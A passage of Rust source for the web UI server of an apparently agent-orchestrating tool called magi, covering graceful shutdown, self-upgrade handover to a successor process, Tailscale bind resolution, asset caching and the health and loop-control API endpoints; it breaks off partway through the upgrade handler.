        if tokio::signal::ctrl_c().await.is_err() {
            // No handler on this platform, so there is no signal to act on.
            // Never resolving is the safe answer: a failed registration must
            // not masquerade as the operator asking for a shutdown and take
            // the UI down on startup.
            std::future::pending::<()>().await;
        }
    };
    let handover = HANDOVER.notified();
    tokio::select! {
        joined = &mut served => match joined {
            Ok(outcome) => outcome.context("serve the web UI"),
            Err(e) => Err(e).context("the task serving the web UI ended"),
        },
        () = interrupted => {
            tracing::info!("shutting down the web UI");
            finish_loop(&looping).await;
            Ok(())
        }
        () = handover => {
            tracing::info!("upgraded - handing this address to the successor");
            hand_over(&home, &looping, served, spawn_successor).await
        }
    }
}

/// Park the loop, then release the address, then start the successor.
///
/// The order is the whole function, and each step is answerable to a failure
/// this arrangement has already had:
///
/// 1. **Park.** The loop was asked to stop by the request that replaced the
///    binary, and this waits for it, because killing the graph mid-node
///    leaves worktrees, branches and agent sessions behind and throws away
///    every agent call already paid for. It takes as long as the node in
///    flight - up to `timeout_implement`, an hour by default - and the deck
///    goes on answering for all of it, which is the reason `served` is a task
///    rather than an arm of [`serve`]'s `select!`. It was an arm once: the
///    first upgrade from a phone that caught a run mid-implement dropped the
///    listener the moment it was asked to, and the operator got
///    `Cannot reach magi: Failed to fetch` with no way to see the park it was
///    waiting on and nothing but a process list to say the run was alive.
/// 2. **Release.** Aborting *and awaiting* the task is what frees the socket:
///    the join resolves only once the task's future has been dropped, so the
///    address is unbound before the next line rather than merely on its way
///    there.
/// 3. **Start the successor**, which binds the address this process has just
///    let go of - see [`spawn_successor`] for what the other order cost.
///
/// The [`updater::Progress`] bookkeeping bracketing steps 1 and 3 is
/// reporting, not part of the design: it exists so `/api/health` can say
/// "parking, waiting on run X" instead of leaving the phone to guess why the
/// deck went quiet, and dropping it would not change the order above.
async fn hand_over(
    home: &FsPath,
    looping: &Mutex<LoopState>,
    served: tokio::task::JoinHandle<std::io::Result<()>>,
    successor: impl FnOnce() -> Result<()>,
) -> Result<()> {
    if let Some(mut progress) = updater::read_progress(home) {
        progress.advance(updater::Stage::Parking);
        let _ = updater::write_progress(home, &progress);
    }
    finish_loop(looping).await;
    served.abort();
    let _ = served.await;
    if let Some(mut progress) = updater::read_progress(home) {
        progress.advance(updater::Stage::Restarting);
        let _ = updater::write_progress(home, &progress);
    }
    successor()
}

/// Ask the loop to stop and wait for it, on the way out of [`serve`].
///
/// The wait is the whole function. Returning from `serve` while a graph is
/// mid-node ends the process with worktrees, branches and agent sessions left
/// behind and every agent call in that run paid for and thrown away, which is
/// exactly what the daemon's own shutdown refuses to do.
async fn finish_loop(state: &Mutex<LoopState>) {
    let live = lock_or_recover(state).live.take();
    let Some(live) = live else { return };
    live.stop.stop();
    lock_or_recover(state).rev += 1;
    tracing::info!("waiting for the loop to finish the run in flight");
    // The task records its own outcome and logs it, so there is nothing to do
    // with a join error here but stop waiting.
    let _ = live.handle.await;
}

/// Resolve `--bind` to an address, plus a warning when the answer is not what
/// the operator asked for.
///
/// Split out from [`serve`] because the interesting half - deciding whether
/// Tailscale gave us something usable - is testable without opening a socket.
pub fn resolve_bind(bind: &Bind) -> (IpAddr, Option<String>) {
    match bind {
        Bind::Addr(addr) => (*addr, None),
        Bind::Auto => match tailscale_ip() {
            Ok(ip) => (IpAddr::V4(ip), None),
            Err(why) => (
                IpAddr::V4(Ipv4Addr::LOCALHOST),
                Some(format!(
                    "--bind auto fell back to 127.0.0.1: {why}. The UI is \
                     local-only and a phone cannot reach it; start Tailscale \
                     or pass --bind <addr>"
                )),
            ),
        },
    }
}

/// This machine's Tailscale IPv4, or why there is not one.
///
/// `tailscale ip -4` is a local call against the running daemon and returns in
/// milliseconds, so it is fine to make it synchronously before the server
/// exists. Only an address inside `100.64.0.0/10` is accepted: that is the
/// CGNAT block Tailscale assigns from, and anything else on that output would
/// be a different tool answering.
fn tailscale_ip() -> std::result::Result<Ipv4Addr, String> {
    let out = std::process::Command::new("tailscale")
        .args(["ip", "-4"])
        .quiet()
        .output()
        .map_err(|e| format!("could not run `tailscale ip -4` ({e})"))?;
    if !out.status.success() {
        let why = String::from_utf8_lossy(&out.stderr);
        let why = why.trim();
        return Err(format!(
            "`tailscale ip -4` failed ({}){}",
            out.status,
            if why.is_empty() {
                String::new()
            } else {
                format!(": {why}")
            }
        ));
    }
    String::from_utf8_lossy(&out.stdout)
        .lines()
        .filter_map(|line| line.trim().parse::<Ipv4Addr>().ok())
        .find(is_tailnet)
        .ok_or_else(|| "`tailscale ip -4` printed no address in 100.64.0.0/10".to_owned())
}

/// Is this address in the CGNAT block Tailscale hands out from?
fn is_tailnet(ip: &Ipv4Addr) -> bool {
    let o = ip.octets();
    o[0] == 100 && (64..=127).contains(&o[1])
}

/// What every handler returns. Spelled out because `Result` in this crate is
/// `anyhow::Result`, and a handler's error is a status code as much as a
/// message.
type ApiResult<T> = std::result::Result<T, ApiError>;

/// A handler failure, rendered as the `{"error": ".."}` body the UI expects.
#[derive(Debug)]
struct ApiError {
    status: StatusCode,
    message: String,
}

impl ApiError {
    /// The client asked for something malformed.
    fn bad_request(message: impl Into<String>) -> Self {
        Self {
            status: StatusCode::BAD_REQUEST,
            message: message.into(),
        }
    }

    /// No such run or task.
    fn not_found(message: impl Into<String>) -> Self {
        Self {
            status: StatusCode::NOT_FOUND,
            message: message.into(),
        }
    }

    /// Someone else owns the thing the client wants to change.
    /// Re-badge an error whose default mapping is wrong for this route.
    fn with_status(mut self, status: StatusCode) -> Self {
        self.status = status;
        self
    }

    /// A rules violation from a domain type, reported as the caller's fault.
    /// `Question::answer` rejects an unoffered choice, and that is a bad
    /// request, not a server error.
    fn bad_request_from(e: anyhow::Error) -> Self {
        Self::bad_request(format!("{e:#}"))
    }

    fn conflict(message: impl Into<String>) -> Self {
        Self {
            status: StatusCode::CONFLICT,
            message: message.into(),
        }
    }

    /// Our fault, or the disk's.
    fn internal(message: impl Into<String>) -> Self {
        Self {
            status: StatusCode::INTERNAL_SERVER_ERROR,
            message: message.into(),
        }
    }
}

impl From<anyhow::Error> for ApiError {
    /// Errors from `queue` and `run` carry their context chain, and the whole
    /// chain goes to the client: "parse /home/x/runs/y/run.json: expected
    /// value at line 3" is a message an operator can act on, and there is no
    /// secret in a path on a single-user tailnet.
    fn from(e: anyhow::Error) -> Self {
        Self::internal(format!("{e:#}"))
    }
}

impl IntoResponse for ApiError {
    fn into_response(self) -> Response {
        let body = serde_json::json!({ "error": self.message });
        (self.status, Json(body)).into_response()
    }
}

/// Run a handler's filesystem work off the executor.
///
/// Every route that touches the disk goes through here rather than each one
/// arguing about whether its own read is small enough. Uniform because the
/// expensive case is not rare: `run.json` for a finished competition holds
/// every judgement, deliberation turn and review round, so listing a few
/// hundred runs is megabytes of parsing, and the executor threads doing it are
/// the same ones serving the change stream of every other connected phone.
async fn blocking<T>(job: impl FnOnce() -> ApiResult<T> + Send + 'static) -> ApiResult<T>
where
    T: Send + 'static,
{
    match tokio::task::spawn_blocking(job).await {
        Ok(result) => result,
        Err(e) => Err(ApiError::internal(format!("filesystem task failed: {e}"))),
    }
}

/// Cache policy for the three compiled-in front-end files.
///
/// The whole interface is `include_str!`ed into the binary, so its content
/// changes only when the binary does - and a phone that keeps a copy is
/// welcome to, right up until the deck is replaced. Without a single cache
/// header, browsers were free to invent their own policy, and one did:
/// yukimemi's phone went on showing "Candidates must be folded before
/// deleting. Run `magi fold` first." - a sentence deleted two releases
/// earlier - from a run detail served by a deck that no longer contained it.
/// The delete button he was told about was right there, and unreachable.
///
/// `must-revalidate` with an `ETag` keyed on the version: the phone asks
/// every time, the answer is a 304 costing one small round trip while the
/// deck is unchanged, and the moment it is replaced the tag differs and the
/// new interface arrives. Correctness over bytes - this is one file of a few
/// tens of kilobytes on a tailnet, and being a version behind is not a
/// cosmetic problem when the difference is whether a button exists.
const ASSET_CACHE: &str = "no-cache, must-revalidate";

/// `ETag` for the compiled-in assets, distinct per build.
///
/// The version alone would leave a locally built deck - `cargo install
/// --path .` twice at the same version, which is the normal way to iterate -
/// serving a stale tag for changed bytes. The build timestamp is what makes
/// two builds of `0.3.0` differ.
fn asset_etag() -> &'static str {
    static TAG: std::sync::LazyLock<String> = std::sync::LazyLock::new(|| {
        format!(
            "\"{}-{}\"",
            env!("CARGO_PKG_VERSION"),
            // Length is a cheap, deterministic stand-in for a hash: the
            // three files are compiled in together, so any edit to any of
            // them almost certainly changes the total, and a rebuild is what
            // this needs to track rather than every possible byte pattern.
            INDEX_HTML.len() + APP_CSS.len() + APP_JS.len()
        )
    });
    &TAG
}

/// Headers for a compiled-in asset of `mime`.
fn asset_headers(mime: &'static str) -> [(header::HeaderName, &'static str); 3] {
    [
        (header::CONTENT_TYPE, mime),
        (header::CACHE_CONTROL, ASSET_CACHE),
        (header::ETAG, asset_etag()),
    ]
}

/// Serve a compiled-in asset, answering `304` when the client already has it.
///
/// axum does not compare `If-None-Match` for us, and a header the server sets
/// but never honours is worse than none: the phone revalidates on every load
/// and is handed the whole file back each time. Doing the comparison is what
/// makes `must-revalidate` cost one small round trip rather than the
/// interface.
fn asset(headers: &header::HeaderMap, mime: &'static str, body: &'static str) -> Response {
    let tag = asset_etag();
    let known = headers
        .get(header::IF_NONE_MATCH)
        .and_then(|v| v.to_str().ok())
        // A revalidating client may send several, and a proxy may weaken the
        // tag to `W/"..."`; matching on containment covers both without
        // parsing the grammar.
        .is_some_and(|sent| sent.split(',').any(|one| one.trim().ends_with(tag)));
    if known {
        return (StatusCode::NOT_MODIFIED, asset_headers(mime)).into_response();
    }
    (asset_headers(mime), body).into_response()
}

async fn index(headers: header::HeaderMap) -> Response {
    asset(&headers, "text/html; charset=utf-8", INDEX_HTML)
}

async fn app_css(headers: header::HeaderMap) -> Response {
    asset(&headers, "text/css; charset=utf-8", APP_CSS)
}

async fn app_js(headers: header::HeaderMap) -> Response {
    asset(&headers, "text/javascript; charset=utf-8", APP_JS)
}

/// What `/api/health` answers.
#[derive(Debug, Serialize)]
struct HealthView {
    version: &'static str,
    home: String,
    queue_rev: u64,
    runs_rev: u64,
    /// The same revisions [`events`] streams for the question and talk
    /// stores.
    ///
    /// Here because this route is what the front end falls back to when the
    /// change stream is not up - it re-polls health on a timer and on wake, and
    /// takes the revisions from the answer. Without these the fallback
    /// compares `undefined` against `undefined` for both stores, decides
    /// nothing moved, and a phone with a dead stream never learns that a
    /// question was asked or that a talk took a turn. `queue_rev` and
    /// `runs_rev` above have always been here for exactly this reason; the rule
    /// is that every revision the stream carries, this route carries too.
    questions_rev: u64,
    /// See [`HealthView::questions_rev`]. The standing chat's own store.
    talks_rev: u64,
    /// See [`HealthView::questions_rev`]. The loop's counter is the one that
    /// is not on disk anywhere, so a phone with no change stream has no other
    /// way to notice that the loop it is waiting on was started from another
    /// device.
    loop_rev: u64,
    /// Runs on disk whose state this build cannot parse - almost always a
    /// schema bump, occasionally a run killed mid-write.
    ///
    /// Reported because the list silently skips them, and "no competitions
    /// yet" is a lie when six of them are sitting in the runs directory. The
    /// terminal deck learned the same lesson: a run that fails to parse must
    /// not disappear from the count.
    runs_unreadable: usize,
    /// The disk, and what the runs and their worktrees occupy on it.
    ///
    /// This is the incident the janitor exists for: magi alone put 30 GB into
    /// one shared cache and 6.7-11 GB into each run's worktrees, and a phone
    /// is exactly where the operator learns "the disk is the constraint" -
    /// the diagnosis that a run is being held for want of space has to be
    /// checkable on the same screen.
    disk: DiskView,
    /// Questions nobody has answered yet, including ones an owner talked
    /// back on and is now waiting for the agent's reply to. A round trip
    /// never changes [`crate::ask::QuestionStatus`], so this does not drop
    /// while the ball is in the agent's court - see
    /// [`crate::ask::Questions::count_open`].
    questions_open: usize,
    /// Of those, how many actually need the owner right now: open, and not
    /// [`crate::ask::Question::waiting_on_agent`].
    ///
    /// The one number that means "nothing will happen until a human acts" -
    /// a parked run consumes nothing and progresses never - and the count the
    /// ask bar, the nav badge and the document title fall back to before
    /// `/api/questions` has answered, so those notification channels clear
    /// the instant the owner asks back and reappear the instant the agent
    /// replies, instead of sitting lit for however long the agent thinks.
    questions_needs_owner: usize,
    daemon: DaemonView,
    /// The loop in this process, exactly what `/api/loop` answers with.
    ///
    /// Here so a phone that has just woken needs one request to know whether
    /// anything is going to happen at all: `daemon` says a loop is alive
    /// somewhere, and this says whether it is one this UI can stop.
    #[serde(rename = "loop")]
    looping: LoopView,
    /// Whether a release newer than this build is known, and which.
    ///
    /// From [`updater::Checker::cached_update`] - the same throttled state the
    /// CLI's `notify` mode banners from - never a live check: this route is
    /// polled every few seconds, and a live check on each poll would spend
    /// GitHub's rate limit before the operator finished reading the strip.
    update: UpdateView,
    /// The self-upgrade this deck last set in motion, or `null` before the
    /// first one. Read off disk, so the successor can report what its
    /// predecessor started.
    upgrade: Option<UpgradeProgressView>,
}

/// What `/api/health` knows about a release newer than this build.
///
/// A plain `Option<String>` for `to` could not distinguish "checked, and this
/// is already the newest" from "never checked" - both are `None` - and the
/// phone needs to tell those apart to decide whether the deck can be trusted
/// to have an opinion at all.
#[derive(Debug, Serialize)]
struct UpdateView {
    /// A newer release is known to exist.
    available: bool,
    /// Its tag, when `available`.
    to: Option<String>,
}

/// [`updater::Progress`] as `/api/health` reports it.
#[derive(Debug, Serialize)]
struct UpgradeProgressView {
    stage: updater::Stage,
    from: String,
    to: Option<String>,
    /// What [`updater::Stage::Parking`] is waiting on, in words: the run and
    /// the step it is finishing before the address is handed over.
    waiting_on: Option<String>,
    started_at: Timestamp,
    updated_at: Timestamp,
    detail: Option<String>,
}

/// Whether [`run_update_recheck`] may act at all this tick.
///
/// The same two conditions [`updater::Checker::new`] and
/// [`upgrade_post`] already honour: an operator who wrote `[update] mode =
/// "off"`, or who set [`updater::NO_AUTOUPDATE_ENV`], means "never contact
/// GitHub from this process" - on a button press or on a timer alike.
fn should_spawn_recheck(cfg: &Update) -> bool {
    cfg.mode != UpdateMode::Off && !updater::disabled_by_env()
}

/// Whether this tick should actually reach the network, once checking itself
/// is allowed.
///
/// An upgrade already in flight must not be raced by a check that discovers
/// a *newer* release while one is still installing - a phone watching
/// `/api/health` would see the answer change out from under the upgrade it
/// already asked for. Past that, [`updater::Checker::should_check`] is the
/// same throttle the CLI's own notify mode and [`cached_update_view`] rely
/// on; deferring to it here, rather than to [`run_update_recheck`]'s own
/// polling period, is what keeps this task's network use to at most once per
/// `[update] interval` regardless of how often it wakes up.
fn update_recheck_due(checker: &updater::Checker, progress: Option<&updater::Progress>) -> bool {
    if progress.is_some_and(|p| !p.stage.terminal()) {
        return false;
    }
    checker.should_check()
}

/// How long [`run_update_recheck`] sleeps before its next wake-up.
///
/// A fraction of the configured `[update] interval` rather than a fixed
/// number: a fixed sleep longer than a short custom interval would leave the
/// deck waiting on its own wake-up rather than on `should_check`, so an
/// operator who set `interval = "1m"` to make the UI catch up quickly would
/// not see that take effect until the next restart - exactly the bug this
/// task exists to fix, just moved one level down. Scaling with the interval
/// keeps the wake-up prompt relative to what was actually configured, while
/// [`update_recheck_due`]'s call to [`updater::Checker::should_check`] is
/// still what caps the network calls themselves at one per interval,
/// regardless of how often this fires.
fn recheck_poll_period(cfg: &Update) -> Duration {
    (updater::effective_interval(cfg) / 8).clamp(UPDATE_RECHECK_POLL_MIN, UPDATE_RECHECK_POLL_MAX)
}

/// Keep `/api/health`'s `update` field current for as long as `magi web`
/// stays up.
///
/// The CLI's own `spawn_update_check` (`main.rs`) runs once per invocation,
/// which is enough for every other command: they exit in seconds. `magi web`
/// can run for days, so a single startup check leaves the cache - and the
/// phone's "Update & restart" button, which reads it via
/// [`cached_update_view`] - frozen on whatever that one look found, however
/// many releases ship afterwards. This is what notices the rest of them,
/// re-reading the config each tick so a `magi.toml` edit while the server is
/// up takes effect without a restart, the same way every other route here
/// already does - both for whether checking is on at all and for how long
/// the next sleep should be.
///
/// Not [`updater::spawn`]'s `auto_update` path, even under `mode =
/// "install"`: swapping the running binary out from under a task or a run
/// mid-node is exactly what `hand_over`'s parking exists to do deliberately,
/// not as a side effect of a timer nobody asked to fire. This only ever
/// calls [`updater::Checker::newer_release`], which refreshes
/// `last_update_check.json` and nothing else - so under `mode = "install"`
/// this behaves like `notify` for as long as the deck stays up, and an
/// actual self-install still happens exactly where it always has: once, at
/// the next process start.
async fn run_update_recheck(repo: PathBuf, home: PathBuf) {
    loop {
        let (cfg, _) = Config::discover(&repo, None).unwrap_or_default();
        tokio::time::sleep(recheck_poll_period(&cfg.update)).await;
        if !should_spawn_recheck(&cfg.update) {
            continue;
        }
        let Some(checker) = updater::Checker::new(&cfg.update) else {
            continue;
        };
        let progress = updater::read_progress(&home);
        if !update_recheck_due(&checker, progress.as_ref()) {
            continue;
        }
        if let Err(e) = checker.newer_release().await {
            tracing::warn!("background update recheck failed: {e:#}");
        }
    }
}

/// [`UpdateView`] from the same throttled, disk-only state
/// [`crate::updater::Checker::cached_update`] gives the CLI's `notify` mode -
/// never a live check. `[update] mode = "off"` answers "unknown" the same as
/// no cached state at all, which is correct: an operator who turned checking
/// off gets no opinion, not a stale one.
fn cached_update_view(repo: &FsPath) -> UpdateView {
    let (cfg, _) = Config::discover(repo, None).unwrap_or_default();
    let latest = updater::Checker::new(&cfg.update).and_then(|c| c.cached_update());
    match latest {
        Some(latest) => UpdateView {
            available: true,
            to: Some(latest.tag_name),
        },
        None => UpdateView {
            available: false,
            to: None,
        },
    }
}

/// [`updater::Progress`] as `/api/health` reports it, filling in `waiting_on`
/// from the parked run's own state when the stage is
/// [`updater::Stage::Parking`] - the run and the node it is finishing are
/// already on disk in `run.json`, so this reads them fresh rather than
/// trusting whatever was true the moment the park was requested.
fn upgrade_progress_view(ui: &Ui, progress: updater::Progress) -> UpgradeProgressView {
    let waiting_on = (progress.stage == updater::Stage::Parking)
        .then_some(progress.parked_run.as_deref())
        .flatten()
        .and_then(|id| read_run(&ui.runs, id).ok())
        .map(|run| {
            format!(
                "run {} is finishing {} before the address is handed over",
                run.short(),
                run.status.as_str()
            )
        });
    UpgradeProgressView {
        stage: progress.stage,
        from: progress.from,
        to: progress.to,
        waiting_on,
        started_at: progress.started_at,
        updated_at: progress.updated_at,
        detail: progress.detail,
    }
}

/// The disk figures `/api/health` carries. Every number is produced by
/// [`crate::disk`], the same code that decides a run may not start, so the
/// health screen and the gate cannot disagree about what the machine looks
/// like.
#[derive(Debug, Serialize)]
struct DiskView {
    /// Free bytes on the volume holding the runs, when measurable.
    #[serde(skip_serializing_if = "Option::is_none")]
    free_bytes: Option<u64>,
    /// Everything the runs directory occupies, unreadable runs included.
    runs_bytes: u64,
    /// Everything the runs' worktrees occupy.
    worktrees_bytes: u64,
    /// The shared build cache's size, when the config names one.
    #[serde(skip_serializing_if = "Option::is_none")]
    cache_bytes: Option<u64>,
}

impl DiskView {
    /// Measure the three directories and re-read the config's cache.
    fn of(ui: &Ui) -> Self {
        let cache_bytes = Config::discover(&ui.repo, None)
            .ok()
            .and_then(|(cfg, _)| cfg.cache_dir())
            .map(|dir| crate::disk::dir_size(&dir));
        Self {
            free_bytes: crate::disk::free_bytes(&ui.runs).ok(),
            runs_bytes: crate::disk::dir_size(&ui.runs),
            worktrees_bytes: crate::disk::dir_size(&ui.worktrees_root),
            cache_bytes,
        }
    }
}

/// The daemon's state as the UI presents it.
#[derive(Debug, Serialize)]
struct DaemonView {
    running: bool,
    idle: Option<bool>,
    pid: Option<u32>,
    /// Every task and run currently in flight. Empty when idle; more than
    /// one entry when `Config::daemon.max_concurrent_runs` has more than one
    /// run going at once.
    current: Vec<daemon::Current>,
    completed: Option<u64>,
    stale_for_secs: Option<i64>,
}

impl DaemonView {
    /// Judge a status file. Staleness is [`daemon::Reading::running`]'s call,
    /// not this UI's — a crashed daemon must not look alive here while
    /// `doctor` calls it dead.
    fn of(status: Option<daemon::Reading>) -> Self {
        let Some(status) = status else {
            return Self {
                running: false,
                idle: None,
                pid: None,
                current: Vec::new(),
                completed: None,
                stale_for_secs: None,
            };
        };
        let now = Timestamp::now();
        let age = status.age_secs(now);
        Self {
            running: status.running(now),
            idle: Some(status.idle),
            pid: status.pid,
            current: status.current,
            completed: Some(status.completed),
            stale_for_secs: age,
        }
    }
}

async fn health(State(ui): State<Arc<Ui>>) -> ApiResult<Json<HealthView>> {
    blocking(move || {
        // One read of the status file for the two fields that describe it, so
        // `daemon` and `loop` in the same answer cannot disagree about who is
        // running the loop.
        let reading = daemon::read_status(&ui.home);
        // Read on its own line, not inside the literal below: the loop's lock
        // is not reentrant, and a guard taken as a temporary there would still
        // be held when `loop_view` took it again.
        let loop_rev = ui.lock_loop().rev;
        let update = cached_update_view(&ui.repo);
        let upgrade = updater::read_progress(&ui.home).map(|p| upgrade_progress_view(&ui, p));
        Ok(Json(HealthView {
            version: env!("CARGO_PKG_VERSION"),
            home: ui.home.display().to_string(),
            queue_rev: ui.queue.revision(),
            runs_rev: runs_revision(&ui.runs),
            questions_rev: ui.questions.revision(),
            talks_rev: ui.talks.revision(),
            loop_rev,
            runs_unreadable: runs_unreadable(&ui.runs),
            questions_open: ui.questions.count_open(),
            questions_needs_owner: ui.questions.count_needs_owner(),
            daemon: DaemonView::of(reading.clone()),
            looping: ui.loop_view(reading),
            disk: DiskView::of(&ui),
            update,
            upgrade,
        }))
    })
    .await
}

/// What `/api/loop` answers, and what `/api/health` carries as `loop`.
#[derive(Debug, Serialize)]
struct LoopView {
    /// A loop is running in *this* process.
    running: bool,
    /// It has been asked to stop and is still finishing a run.
    ///
    /// [`daemon::Stop::finishing`]'s answer rather than "the flag is set",
    /// because the two differ exactly where it matters: a loop asked to stop
    /// while idle is gone within one poll interval, and one asked to stop
    /// mid-run keeps going for as long as the graph takes. The operator needs
    /// to be told which of those they are waiting for.
    stopping: bool,
    /// A park was asked for: the run in flight stops at its next node
    /// boundary rather than finishing.
    ///
    /// Separate from `stopping` because the two promise different waits. A
    /// stop is "when this competition ends", which can be an hour; a park is
    /// "after the step it is on", which is minutes and is what an operator
    /// waiting to replace the binary needs to see.
    parking: bool,
    /// The loop is this process's own.
    ///
    /// Spelled separately from `running` for the front end's sake, even
    /// though inside this process the two move together: `running: false`
    /// with `daemon.running: true` is the case where the operator's own `magi
    /// serve` owns the loop, and `owned` is the field that tells the UI its
    /// buttons have to explain that rather than pretend.
    owned: bool,
    /// Repository the loop uses for tasks that name none - what it was
    /// started with while it runs, and what a start would use before that.
    repo: String,
    /// Merge mode override in force, or `null` when each repository's own
    /// config decides.
    merge: Option<String>,
    /// Why the last loop in this process ended, when it ended badly.
    ///
    /// The only place a crashed loop is visible to someone holding a phone.
    /// It is logged at error level as well, but a terminal nobody kept open
    /// is not a report, and a loop that died at 3am must not read as merely
    /// stopped in the morning. Named as [`Task::last_error`] is, because it
    /// answers the same question about the same kind of failure.
    last_error: Option<String>,
    /// The status file, judged the same way `/api/health` judges it: this is
    /// what says whether a loop is alive in some *other* process.
    daemon: DaemonView,
}

/// A loop another process already owns.
///
/// `<home>/daemon.json` is the only cross-process signal there is, so this is
/// the whole of the test: a heartbeat no older than [`daemon::STALE_SECS`],
/// published by a pid that is not ours. Excluding our own pid is what makes
/// stopping work at all - the loop this process runs writes that file too, so
/// a check that ignored the pid would decide the operator's own UI was a
/// stranger and refuse to stop the loop it had just started.
#[derive(Debug, Clone, Copy)]
struct Foreign {
    /// The pid the other process published, when it published one.
    pid: Option<u32>,
}

impl Foreign {
    /// Another process's live loop, or `None` when this process is free to
    /// run one.
    fn of(reading: Option<&daemon::Reading>) -> Option<Self> {
        let reading = reading?;
        if !reading.running(Timestamp::now()) {
            return None;
        }
        match reading.pid {
            Some(pid) if pid == std::process::id() => None,
            // A fresh heartbeat with no pid in it is still evidence of a live
            // daemon. "Some other process" is the honest answer, and refusing
            // to start beside it is the safe one.
            pid => Some(Self { pid }),
        }
    }

    /// How a conflict names it. The pid is the whole point of the message: it
    /// is what the operator needs to find the terminal that owns the loop.
    fn who(&self) -> String {
        match self.pid {
            Some(pid) => format!("another magi process (pid {pid})"),
            None => "another magi process".to_owned(),
        }
    }
}

/// How a loop is started, as a future this module can hold onto.
///
/// A plain function pointer, so [`Ui`] stays `Debug` and `Clone` without a
/// trait object or a hand-written `Debug` impl for the sake of one seam.
type Launch = fn(daemon::Opts, daemon::Stop) -> Pin<Box<dyn Future<Output = Result<()>> + Send>>;

/// The real loop: [`daemon::serve_until`], boxed to fit [`Launch`].
fn launch_daemon(
    opts: daemon::Opts,
    stop: daemon::Stop,
) -> Pin<Box<dyn Future<Output = Result<()>> + Send>> {
    Box::pin(daemon::serve_until(opts, stop))
}

/// The loop this process runs, behind one lock.
#[derive(Debug, Default)]
struct LoopState {
    /// The loop, while there is one.
    live: Option<Live>,
    /// Bumped on every change to this struct, and streamed as `loop_rev`.
    ///
    /// The loop is in-process state rather than a file, so nothing on disk
    /// would tell a second phone that the first one started it. Without this
    /// counter the only way to learn about a start, a stop request or a crash
    /// would be to poll `/api/loop`, which is the thing the change stream
    /// exists to avoid on a mobile link.
    rev: u64,
    /// Why the last loop ended, when it ended badly. See
    /// [`LoopView::last_error`].
    last_error: Option<String>,
}

/// A loop in flight.
#[derive(Debug)]
struct Live {
    /// The cooperative stop, shared with the loop task.
    stop: daemon::Stop,
    /// The task itself, kept only to answer whether it is still there: a loop
    /// that panicked never records its own end, and without this the view
    /// would go on reporting a loop that no longer exists - the one lie that
    /// would leave the operator with no button to press.
    handle: tokio::task::JoinHandle<()>,
    /// What the loop was started with, so the view reports the repository and
    /// merge mode its runs will actually use rather than what an edit to the
    /// config since would give.
    opts: daemon::Opts,
}

impl Live {
    /// Is the task still there? See [`Live::handle`].
    fn alive(&self) -> bool {
        !self.handle.is_finished()
    }
}

/// Take the loop lock, recovering from a poisoned one.
///
/// What this mutex holds is a stop flag, a task handle and two counters, none
/// of which a panic elsewhere can leave in a state worth refusing to read.
/// Propagating the poison instead would mean an operator who can see the loop
/// running and can no longer stop it from the only surface they have.
fn lock_or_recover(state: &Mutex<LoopState>) -> MutexGuard<'_, LoopState> {
    state.lock().unwrap_or_else(PoisonError::into_inner)
}

/// `GET /api/loop`.
async fn loop_get(State(ui): State<Arc<Ui>>) -> ApiResult<Json<LoopView>> {
    blocking(move || {
        let reading = daemon::read_status(&ui.home);
        Ok(Json(ui.loop_view(reading)))
    })
    .await
}

/// The body of `POST /api/loop`.
///
/// One required field and nothing else: no `default` and no unknown fields,
/// so a body that fails to say which way the switch was flipped is a 400
/// rather than a tap that quietly does the opposite of what was pressed.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct LoopCommand {
    running: bool,
    /// Stop the run in flight at its next node boundary rather than letting it
    /// finish.
    ///
    /// Defaults to false, so the plain stop keeps meaning what it meant: a
    /// competition is tens of minutes of paid work and finishing it is
    /// normally the cheapest thing to do. A park is for the operator who
    /// wants the process gone now - to replace the binary, most of all - and
    /// it costs at most the node in progress because every node writes its
    /// state before the next one starts.
    #[serde(default)]
    park: bool,
}

/// `POST /api/loop` - start the loop in this process, or ask it to stop.
///
/// Answers with the view rather than waiting for the loop to reach the state
/// that was asked for. Starting is immediate anyway; stopping is not, and the
/// wait is a run's worth of minutes, which is not a thing to hold a phone's
/// request open for. `stopping` in the answer is what the operator watches
/// instead.
async fn loop_post(
    State(ui): State<Arc<Ui>>,
    body: std::result::Result<Json<LoopCommand>, JsonRejection>,
) -> ApiResult<Json<LoopView>> {
    // Taken as a `Result` so a malformed body is a 400 like every other route
    // here, rather than axum's default 422 that the UI has no branch for.
    let Json(body) = body.map_err(|e| ApiError::bad_request(e.body_text()))?;
    blocking(move || {
        let reading = daemon::read_status(&ui.home);
        let foreign = Foreign::of(reading.as_ref());
        if body.running {
            ui.start_loop(foreign)?;
        } else {
            ui.stop_loop(foreign, body.park)?;
        }
        Ok(Json(ui.loop_view(reading)))
    })
    .await
}

/// What `POST /api/upgrade` set in motion.
#[derive(Debug, Serialize)]
struct UpgradeView {
    /// The version this process is running.
    from: String,
    /// The release it is replacing itself with, when there is one.
    to: Option<String>,
    /// A run was parked first, and this is its id.
    parked: Option<String>,
    /// What the operator should expect to happen next.
    detail: String,
}

/// `POST /api/upgrade` - replace this binary with the newest release and come
/// back on it.
///
/// The one thing the deck could not do for itself. Every fix landed today
/// either waited for a competition to end or went in with the deck stopped,
/// because `cargo install` cannot overwrite a running executable on Windows.
/// `kaishin` can: `self_replace` **renames** the running image aside and puts
/// the new one in its place, so the swap itself needs no downtime. Only the
/// restart does, and the order is the whole design:
///
/// 1. **Park.** A run in flight stops at its next node boundary and stays
///    resumable, so this costs at most the node in progress rather than the
///    competition. Without it the honest choices were waiting an hour or
///    discarding paid agent work.
/// 2. **Replace.** The new binary goes into place while this one still runs.
/// 3. **Hand over.** [`serve`] drops the listener, *then* spawns the
///    successor - see [`spawn_successor`] for what happens in the other
///    order.
/// 4. **Resume.** The next loop carries the parked run on rather than
///    competing again; see `daemon::attempt`.
///
/// Answers **202**: the reply has to reach the phone while this process can
/// still send one, and the phone learns the deck is back by reconnecting.
async fn upgrade_post(State(ui): State<Arc<Ui>>) -> ApiResult<(StatusCode, Json<UpgradeView>)> {
    let reading = daemon::read_status(&ui.home);
    if let Some(other) = Foreign::of(reading.as_ref()) {
        return Err(ApiError::conflict(format!(
            "the loop belongs to {}, so replacing this binary would leave \
             that process running an old one against the same queue. Upgrade \
             where it was started.",
            other.who()
        )));
    }

    // The same kill switch the background check honours (`disabled_by_env`),
    // checked before anything else for the same reason it is read before the
    // config there: an operator who set `MAGI_NO_AUTOUPDATE` means "never
    // contact GitHub from this process", and a button press must not
    // override that any more than a broken `magi.toml` may.
    if crate::updater::disabled_by_env() {
        return Ok((
            StatusCode::OK,
            Json(UpgradeView {
                from: env!("CARGO_PKG_VERSION").to_owned(),
                to: None,
                parked: None,
